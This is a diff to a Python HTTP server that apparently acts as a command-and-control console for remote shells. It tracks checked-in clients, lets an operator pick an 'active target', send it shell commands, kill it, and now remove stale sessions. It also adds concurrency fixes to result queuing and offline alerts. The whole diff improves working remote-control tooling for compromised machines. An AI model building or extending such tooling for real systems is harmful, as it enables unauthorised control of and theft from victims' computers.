@@ -152,8 +152,9 @@ class Handler(BaseHTTPRequestHandler):
                 with lock:
                     client = get_or_create_client(client_id)
                     client["command_running"] = False
+            # Use blocking put with timeout for /result — must not be silently dropped
             try:
-                result_queue.put_nowait((client_id, "result", body))
+                result_queue.put((client_id, "result", body), timeout=2)
             except queue.Full:
                 pass
             self._respond(200, b"ok")
@@ -299,6 +300,23 @@ def input_loop():
                     print(f"[!] No client matching '{target}'.")
             continue
 
+        if stripped.startswith("remove "):
+            target = cmd.strip()[7:].strip()
+            if not target:
+                print("[*] Usage: remove <client-id or number>")
+                continue
+            with lock:
+                match = _resolve_client(target)
+                if match:
+                    del clients[match]
+                    print(f"[*] Removed {match} from sessions.")
+                    if active_client == match:
+                        active_client = None
+                        print("[*] Active target cleared.")
+                else:
+                    print(f"[!] No client matching '{target}'.")
+            continue
+
         if stripped == "help":
             print("[*] Built-in commands:")
             print("      sessions — list all connected clients")
@@ -307,6 +325,7 @@ def input_loop():
             print("      Ctrl+\\   — same as cancel (keyboard shortcut)")
             print("      status   — check active client connectivity")
             print("      kill <id>— send exit to a specific client")
+            print("      remove   — remove a stale/dead client from sessions")
             print("      exit     — shut down the server")
             print("      help     — show this message")
             print("    Anything else is sent to the active client's shell.")
@@ -335,19 +354,26 @@ def status_printer():
     shown_warnings = set()
     while True:
         time.sleep(10)
+        # Copy state under lock, print after releasing
+        alerts = []
+        cleared = []
         with lock:
             for cid, state in clients.items():
                 checkin = state["last_checkin"]
                 if checkin > 0:
                     elapsed = time.time() - checkin
                     if elapsed > 20 and cid not in shown_warnings:
-                        sys.stdout.write(
-                            f"\r\033[K[!] {cid}: No check-in for {elapsed:.0f}s — may be offline\n" + get_prompt()
-                        )
-                        sys.stdout.flush()
+                        alerts.append((cid, elapsed))
                         shown_warnings.add(cid)
                     elif elapsed <= 20:
-                        shown_warnings.discard(cid)
+                        cleared.append(cid)
+        for cid in cleared:
+            shown_warnings.discard(cid)
+        for cid, elapsed in alerts:
+            sys.stdout.write(
+                f"\r\033[K[!] {cid}: No check-in for {elapsed:.0f}s — may be offline\n" + get_prompt()
+            )
+            sys.stdout.flush()
 
 
 if __name__ == "__main__":
